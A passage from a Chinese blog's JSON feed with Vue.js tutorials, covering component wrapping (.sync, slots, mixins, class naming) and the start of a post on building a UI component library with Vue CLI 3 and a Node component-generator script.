<code>update:属性名</code></li>\n</ul>\n</li>\n</ul>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>div</span> <span>v-show</span><span><span>=</span><span>\"</span>visible<span>\"</span></span> <span>@click</span><span><span>=</span><span>\"</span>$_handlerCLick<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>name</span><span>:</span> <span>\"custom-model\"</span><span>,</span>\n  <span>props</span><span>:</span> <span>{</span>\n    <span>visible</span><span>:</span> <span>{</span>\n      <span>type</span><span>:</span> Boolean<span>,</span>\n      <span>default</span><span>:</span> <span>false</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>$_handlerCLick</span><span>(</span><span>)</span> <span>{</span>\n      <span>this</span><span>.</span><span>$emit</span><span>(</span><span>\"update:visible\"</span><span>,</span> <span>false</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>使用方式</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>custom-model</span> <span>:visible.sync</span><span><span>=</span><span>\"</span>show<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>custom-model</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>data</span><span>(</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>show</span><span>:</span> <span>false</span><span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"slot\" tabindex=\"-1\"> slot</h3>\n<div><p>提示</p>\n<p>二次封装时需要保留原组件中的 slot 插槽, <code>$slots</code> 获取到当前组件传入的所有 slot 插槽</p>\n</div>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>component-name</span><span>></span></span>\n    <span><span><span>&lt;</span>template</span> <span>v-for</span><span><span>=</span><span>\"</span>slot in Object.keys($slots)<span>\"</span></span> <span>:slot</span><span><span>=</span><span>\"</span>slot<span>\"</span></span><span>></span></span>\n      <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>\"</span>slot<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;/</span>template</span><span>></span></span>\n  <span><span><span>&lt;/</span>component-name</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在开发过程中, 我们还会遇到以下的场景</p>\n<p>下面是你封装的一个组件, 可以看到 <code>a-form-item</code> 已经有默认的 default 插槽了, 但是我们在使用它时又想自定义 <code>a-form-item</code> 中的其他插槽</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>a-form</span><span>></span></span>\n    <span><span><span>&lt;</span>a-form-item</span> <span>v-for</span><span><span>=</span><span>\"</span>(item, index) in opt<span>\"</span></span> <span>:key</span><span><span>=</span><span>\"</span>index<span>\"</span></span><span>></span></span>\n      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>default<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>\"</span>item.prop<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n\n      <span>&lt;!-- 以下这种写法不优雅, 比较繁琐, 又有重复的代码 --></span>\n      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>label<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>\"</span>`${item.prop}Label`<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>extra<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>\"</span>`${item.prop}Extra`<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>help<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>\"</span>`${item.prop}Help`<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n      <span>&lt;!-- 之后 a-form-item 如果有添加了其他的 slot,岂不是这里还需要继续添加代码, 这样是不好的 --></span>\n    <span><span><span>&lt;/</span>a-form-item</span><span>></span></span>\n  <span><span><span>&lt;/</span>a-form</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>props</span><span>:</span> <span>{</span>\n    <span>opt</span><span>:</span> <span>{</span>\n      <span>type</span><span>:</span> Array<span>,</span>\n      <span>default</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>[</span><span>]</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>可以参考以下的方式优化它</p>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>a-form</span><span>></span></span>\n    <span><span><span>&lt;</span>a-form-item</span> <span>v-for</span><span><span>=</span><span>\"</span>(item, index) in opt<span>\"</span></span> <span>:key</span><span><span>=</span><span>\"</span>index<span>\"</span></span><span>></span></span>\n      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>default<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;</span>slot</span> <span>:name</span><span><span>=</span><span>\"</span>item.prop<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>slot</span><span>></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n\n      <span><span><span>&lt;</span>template</span>\n        <span>v-for</span><span><span>=</span><span>\"</span>itemSlot in getItemSlots(Object.keys($slots))<span>\"</span></span>\n        <span>:slot</span><span><span>=</span><span>\"</span>itemSlot<span>\"</span></span>\n      <span>></span></span>\n        <span><span><span>&lt;</span>slot</span>\n          <span>:name</span><span><span>=</span><span>\"</span>getItemSlotName(itemSlot, item.prop)<span>\"</span></span>\n          <span>v-if</span><span><span>=</span><span>\"</span>getItemSlotName(itemSlot, item.prop)<span>\"</span></span>\n        <span>/></span></span>\n      <span><span><span>&lt;/</span>template</span><span>></span></span>\n    <span><span><span>&lt;/</span>a-form-item</span><span>></span></span>\n  <span><span><span>&lt;/</span>a-form</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>props</span><span>:</span> <span>{</span>\n    <span>opt</span><span>:</span> <span>{</span>\n      <span>type</span><span>:</span> Object<span>,</span>\n      <span>default</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>getItemSlots</span><span>(</span><span>slots</span><span>)</span> <span>{</span>\n      <span>const</span> props <span>=</span> <span>this</span><span>.</span><span>getFormPropKey</span><span>(</span><span>)</span><span>;</span>\n      <span>let</span> itemSlots <span>=</span> slots<span>.</span><span>filter</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> props<span>.</span><span>indexOf</span><span>(</span>item<span>)</span> <span>===</span> <span>-</span><span>1</span><span>)</span><span>;</span>\n      itemSlots <span>=</span> itemSlots<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>\n        <span>const</span> tmp <span>=</span> item<span>.</span><span>split</span><span>(</span><span><span>/</span><span>(?=[A-Z])</span><span>/</span></span><span>)</span><span>;</span>\n        <span>return</span> tmp<span>[</span>tmp<span>.</span>length <span>-</span> <span>1</span><span>]</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>;</span>\n      <span>}</span><span>)</span><span>;</span>\n      <span>return</span> itemSlots<span>;</span>\n    <span>}</span><span>,</span>\n    <span>getItemSlotName</span><span>(</span><span>slot</span><span>)</span> <span>{</span>\n      <span>const</span> _slot <span>=</span> slot<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>\\b\\w</span><span>/</span><span>g</span></span><span>,</span> <span>(</span><span>str</span><span>)</span> <span>=></span> <span>{</span>\n        <span>return</span> str<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>;</span>\n      <span>}</span><span>)</span><span>;</span>\n      <span>return</span> <span><span>`</span><span><span>${</span>prop<span>}</span></span><span><span>${</span>_slot<span>}</span></span><span>`</span></span><span>;</span>\n    <span>}</span><span>,</span>\n    <span>getFormPropKey</span><span>(</span><span>)</span> <span>{</span>\n      <span>const</span> <span>{</span> opt <span>}</span> <span>=</span> <span>this</span><span>;</span>\n      <span>let</span> props <span>=</span> <span>[</span><span>]</span><span>;</span>\n      <span>if</span> <span>(</span>opt<span>.</span>length<span>)</span> <span>{</span>\n        props <span>=</span> opt<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> item<span>.</span>prop<span>)</span><span>;</span>\n      <span>}</span>\n      <span>return</span> props<span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"mixins\" tabindex=\"-1\"> mixins</h3>\n<div><p>提示</p>\n<p><code>mixins</code> 是 Vue 提供的一种混合机制, 用来更高效的实现组件内容的复用。怎么去理解混入呢, 我觉得和 <code>Object.assign</code> , 但实际与 <code>Object.assign</code> 又有所不同。</p>\n</div>\n<p>在 <code>Vue</code> 中, 一个混入对象可以包含任意组件选项, 但是对于不同的组件选项, 会有不同的合并策略。</p>\n<ol>\n<li>data 对于 data, 在混入时会进行递归合并, 如果两个属性发生冲突, 则以组件自身为主</li>\n<li>生命周期钩子函数</li>\n</ol>\n<p>对于生命周期钩子函数, 混入时会将同名钩子函数加入到一个数组中, 然后在调用时依次执行。混入对象里面的钩子函数会优先于组件的钩子函数执行。如果一个组件混入了多个对象, 对于混入对象里面的同名钩子函数, 将按照数组顺序依次执行, 如下代码:</p>\n<div><pre><code><span>const</span> mixin1 <span>=</span> <span>{</span>\n  <span>created</span><span>(</span><span>)</span> <span>{</span>\n    console<span>.</span><span>log</span><span>(</span><span>\"我是第一个输出的\"</span><span>)</span><span>;</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n\n<span>const</span> mixin2 <span>=</span> <span>{</span>\n  <span>created</span><span>(</span><span>)</span> <span>{</span>\n    console<span>.</span><span>log</span><span>(</span><span>\"我是第二个输出的\"</span><span>)</span><span>;</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n\n<span>export</span> <span>default</span> <span>{</span>\n  <span>mixins</span><span>:</span> <span>[</span>mixin1<span>,</span> mixin2<span>]</span><span>,</span>\n  <span>created</span><span>(</span><span>)</span> <span>{</span>\n    console<span>.</span><span>log</span><span>(</span><span>\"我是第三个输出的\"</span><span>)</span><span>;</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ol start=\"3\">\n<li>其他选项 对于值为对象的选项, 如 <code>methods</code>,<code>components</code>,<code>filter</code>,<code>directives</code>,<code>props</code> 等等, 将被合并为同一个对象。两个对象键名冲突时, 取组件对象的键值对。</li>\n</ol>\n<h3 id=\"class\" tabindex=\"-1\"> class</h3>\n<div><p>提示</p>\n<p>关于统一化 class 命名方式, class 命名时需要添加组织前缀的, 以下的方式比较适用</p>\n</div>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>div</span> <span>:class</span><span><span>=</span><span>\"</span>b(<span>'</span>form<span>'</span>)<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>const</span> <span>ELEMENT</span> <span>=</span> <span>\"__\"</span><span>;</span>\n<span>const</span> <span>MODS</span> <span>=</span> <span>\"--\"</span><span>;</span>\n\n<span>const</span> <span>join</span> <span>=</span> <span>(</span><span>name<span>,</span> el<span>,</span> symbol</span><span>)</span> <span>=></span> <span>(</span>el <span>?</span> name <span>+</span> symbol <span>+</span> el <span>:</span> name<span>)</span><span>;</span>\n\n<span>const</span> <span>prefix</span> <span>=</span> <span>(</span><span>name<span>,</span> mods</span><span>)</span> <span>=></span> <span>{</span>\n  <span>if</span> <span>(</span><span>typeof</span> mods <span>===</span> <span>\"string\"</span><span>)</span> <span>{</span>\n    <span>return</span> <span>join</span><span>(</span>name<span>,</span> mods<span>,</span> <span>MODS</span><span>)</span><span>;</span>\n  <span>}</span>\n\n  <span>if</span> <span>(</span>Array<span>.</span><span>isArray</span><span>(</span>mods<span>)</span><span>)</span> <span>{</span>\n    <span>return</span> mods<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>prefix</span><span>(</span>name<span>,</span> item<span>)</span><span>)</span><span>;</span>\n  <span>}</span>\n\n  <span>const</span> ret <span>=</span> <span>{</span><span>}</span><span>;</span>\n  Object<span>.</span><span>keys</span><span>(</span>mods <span>||</span> <span>{</span><span>}</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>\n    ret<span>[</span>name <span>+</span> <span>MODS</span> <span>+</span> key<span>]</span> <span>=</span> mods<span>[</span>key<span>]</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n  <span>return</span> ret<span>;</span>\n<span>}</span><span>;</span>\n\n<span>export</span> <span>default</span> <span>{</span>\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>b</span><span>(</span><span>el<span>,</span> mods</span><span>)</span> <span>{</span>\n      <span>const</span> <span>{</span> name <span>}</span> <span>=</span> <span>this</span><span>.</span>$options<span>;</span>\n\n      <span>if</span> <span>(</span>el <span>&amp;&amp;</span> <span>typeof</span> el <span>!==</span> <span>\"string\"</span><span>)</span> <span>{</span>\n        mods <span>=</span> el<span>;</span>\n        el <span>=</span> <span>\"\"</span><span>;</span>\n      <span>}</span>\n      el <span>=</span> <span>join</span><span>(</span>name<span>,</span> el<span>,</span> <span>ELEMENT</span><span>)</span><span>;</span>\n\n      <span>return</span> mods <span>?</span> <span>[</span>el<span>,</span> <span>prefix</span><span>(</span>el<span>,</span> mods<span>)</span><span>]</span> <span>:</span> el<span>;</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"provide-inject\" tabindex=\"-1\"> Provide / Inject</h3>\n<div><p>提示</p>\n<p>这边参考 vue 的官方文档就好： <a href=\"https://cn.vuejs.org/v2/api/#provide-inject\" target=\"_blank\" rel=\"noopener noreferrer\">provide / inject</a></p>\n</div>\n",
      "date_published": "2020-08-20T11:39:08.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "vuejs"
      ]
    },
    {
      "title": "使用 Vue cli 3.0 构建自定义组件库(第一弹)",
      "url": "https://vxhly.github.io/views/vuejs/custom-component-library-first.html",
      "id": "https://vxhly.github.io/views/vuejs/custom-component-library-first.html",
      "summary": "前言\n本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等。</p>\n</div>\n\n<h2 id=\"先言\" tabindex=\"-1\"> 先言</h2>\n<p>主流的开源 UI 库代码结构主要分为三大部分:</p>\n<ul>\n<li>组件库本身的代码: 这部分代码会发布到 npm 上</li>\n<li>预览示例和查看文档的网站代码: 类似 Vant、ElementUI 这类网站。</li>\n<li>配置文件和脚本文件: 用于打包和发布等等</li>\n</ul>\n<div><p>提示</p>\n<p>编写此博文的灵感 UI 框架库（<a href=\"https://github.com/Eamonnzhang/vue-cards\" target=\"_blank\" rel=\"noopener noreferrer\">vue-cards</a>）, PS: 此 UI 　框架库相对于 Vant、ElementUI 　会比较简单点, 可以作为一份自定义　 UI 　框架库的入坑　 demo, 同时这篇博文也是解读这份 UI 框架库的构建到上线的一个过程</p>\n</div>\n<h2 id=\"前置工作\" tabindex=\"-1\"> 前置工作</h2>\n<p>以下工作全部基于 Vue CLI 3.x, 所以首先要保证机子上有 <code>@vue/cli</code></p>\n<div><pre><code>vue create vtp-component <span>## vtp-component 作为教学的库名</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"start\" tabindex=\"-1\"> start</h2>\n<p>开始造轮子了</p>\n<h3 id=\"工作目录\" tabindex=\"-1\"> 工作目录</h3>\n<p>在根目录下新增四个文件夹, 一个用来存放组件的代码（packages）, 一个用来存放 预览示例的网站 代码（examples）（这里直接把初始化模板的 src 目录更改为 examples 即可, 有需要的话可以将该目录进行清空操作, 这里就不做过多的说明）, 一个用来存放编译脚本代码（build）, 一个用来存放自定义生成组件和组件的说明文档等脚本（scripts）</p>\n<div><pre><code>|-- build\n|\n|-- examples\n|\n|-- packages\n|\n|-- scripts\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"让-webpack-编译-examples\" tabindex=\"-1\"> 让 webpack 编译 examples</h3>\n<p>由于我们将 src 目录修改成了 examples, 所以在 <code>vue.config.js</code> 中需要进行相应的修改</p>\n<div><pre><code><span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n\n<span>function</span> <span>resolve</span><span>(</span><span>dir</span><span>)</span> <span>{</span>\n  <span>return</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> dir<span>)</span><span>;</span>\n<span>}</span>\n\nmodule<span>.</span>exports <span>=</span> <span>{</span>\n  <span>productionSourceMap</span><span>:</span> <span>true</span><span>,</span>\n\n  <span>// 修改 src 为 examples</span>\n  <span>pages</span><span>:</span> <span>{</span>\n    <span>index</span><span>:</span> <span>{</span>\n      <span>entry</span><span>:</span> <span>\"examples/main.js\"</span><span>,</span>\n      <span>template</span><span>:</span> <span>\"public/index.html\"</span><span>,</span>\n      <span>filename</span><span>:</span> <span>\"index.html\"</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n\n  <span>chainWebpack</span><span>:</span> <span>(</span><span>config</span><span>)</span> <span>=></span> <span>{</span>\n    config<span>.</span>resolve<span>.</span>alias<span>.</span><span>set</span><span>(</span><span>\"@\"</span><span>,</span> <span>resolve</span><span>(</span><span>\"examples\"</span><span>)</span><span>)</span><span>;</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"添加编译脚本\" tabindex=\"-1\"> 添加编译脚本</h3>\n<p><code>package.json</code> 其中的组件 name 推荐和创建的项目名一致</p>\n<div><pre><code><span>{</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"lib\"</span><span>:</span> <span>\"vue-cli-service build --target lib --name vtp-component --dest lib packages/index.js\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>修改 main 主入口文件</p>\n<div><pre><code><span>{</span>\n  <span>\"main\"</span><span>:</span> <span>\"lib/vtp-component.common.js\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"一个组件例子\" tabindex=\"-1\"> 一个组件例子</h3>\n<h4 id=\"创建组件和组件文档生成脚本\" tabindex=\"-1\"> 创建组件和组件文档生成脚本</h4>\n<p>在 <code>scripts</code> 中创建以下几个文件, 其中 <code>create-comp.js</code> 是用来生成自定义组件目录和自定义组件说明文档脚本, <code>delete-comp.js</code> 是用来删除无用的组件目录和自定义组件说明文档脚本, <code>template.js</code> 是生成代码的模板文件</p>\n<div><pre><code>|-- create-comp.js\n|\n|-- delete-comp.js\n|\n|-- template.js\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href=\"https://juejin.im/post/5c6772ff518825629c56943c\" target=\"_blank\" rel=\"noopener noreferrer\">vue-cli3 项目优化之通过 node 自动生成组件模板 generate View、Component</a></p>\n<p><code>create-comp.js</code></p>\n<div><pre><code><span>// 创建自定义组件脚本</span>\n\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs-extra\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>\n<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>{</span> vueTemplate<span>,</span> entryTemplate<span>,</span> mdDocs <span>}</span> <span>=</span> <span>require</span><span>(</span><span>\"./template\"</span><span>)</span><span>;</span>\n\n<span>const</span> <span>generateFile</span> <span>=</span> <span>(</span><span>path<span>,</span> data</span><span>)</span> <span>=></span> <span>{</span>\n  <span>if</span> <span>(</span>fs<span>.</span><span>existsSync</span><span>(</span>path<span>)</span><span>)</span> <span>{</span>\n    <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>path<span>}</span></span><span>文件已存在</span><span>`</span></span><span>)</span><span>;</span>\n    <span>return</span><span>;</span>\n  <span>}</span>\n  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>\n    fs<span>.</span><span>writeFile</span><span>(</span>path<span>,</span> data<span>,</span> <span>\"utf8\"</span><span>,</span> <span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>\n      <span>if</span> <span>(</span>err<span>)</span> <span>{</span>\n        <span>errorLog</span><span>(</span>err<span>.</span>message<span>)</span><span>;</span>\n        <span>reject</span><span>(</span>err<span>)</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>\n      <span>}</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n\n<span>// 这里生成自定义组件</span>\n<span>log</span><span>(</span><span>\"请输入要生成的组件名称, 形如 demo 或者 demo-test\"</span><span>)</span><span>;</span>\n<span>let</span> componentName <span>=</span> <span>\"\"</span><span>;</span>\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"data\"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>\n  <span>let</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>\n  inputName <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>\n  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../packages\"</span><span>,</span> inputName<span>)</span><span>;</span>\n  <span>const</span> componentVueName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.vue</span><span>`</span></span><span>)</span><span>;</span>\n  <span>const</span> entryComponentName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span>\"index.js\"</span><span>)</span><span>;</span>\n\n  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n  <span>if</span> <span>(</span>inputName<span>)</span> <span>{</span>\n    <span>// 这里生成组件</span>\n    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>\n      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>组件目录已存在, 请重新输入</span><span>`</span></span><span>)</span><span>;</span>\n      <span>return</span><span>;</span>\n    <span>}</span> <span>else</span> <span>{</span>\n      <span>log</span><span>(</span><span><span>`</span><span>生成 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>dotExistDirectoryCreate</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n    <span>}</span>\n    <span>try</span> <span>{</span>\n      <span>if</span> <span>(</span>inputName<span>.</span><span>includes</span><span>(</span><span>\"/\"</span><span>)</span><span>)</span> <span>{</span>\n        <span>const</span> inputArr <span>=</span> inputName<span>.</span><span>split</span><span>(</span><span>\"/\"</span><span>)</span><span>;</span>\n        componentName <span>=</span> inputArr<span>[</span>inputArr<span>.</span>length <span>-</span> <span>1</span><span>]</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        componentName <span>=</span> inputName<span>;</span>\n      <span>}</span>\n      <span>log</span><span>(</span><span><span>`</span><span>生成 vue 文件 </span><span><span>${</span>componentVueName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>generateFile</span><span>(</span>componentVueName<span>,</span> <span>vueTemplate</span><span>(</span>componentName<span>)</span><span>)</span><span>;</span>\n      <span>log</span><span>(</span><span><span>`</span><span>生成 entry 文件 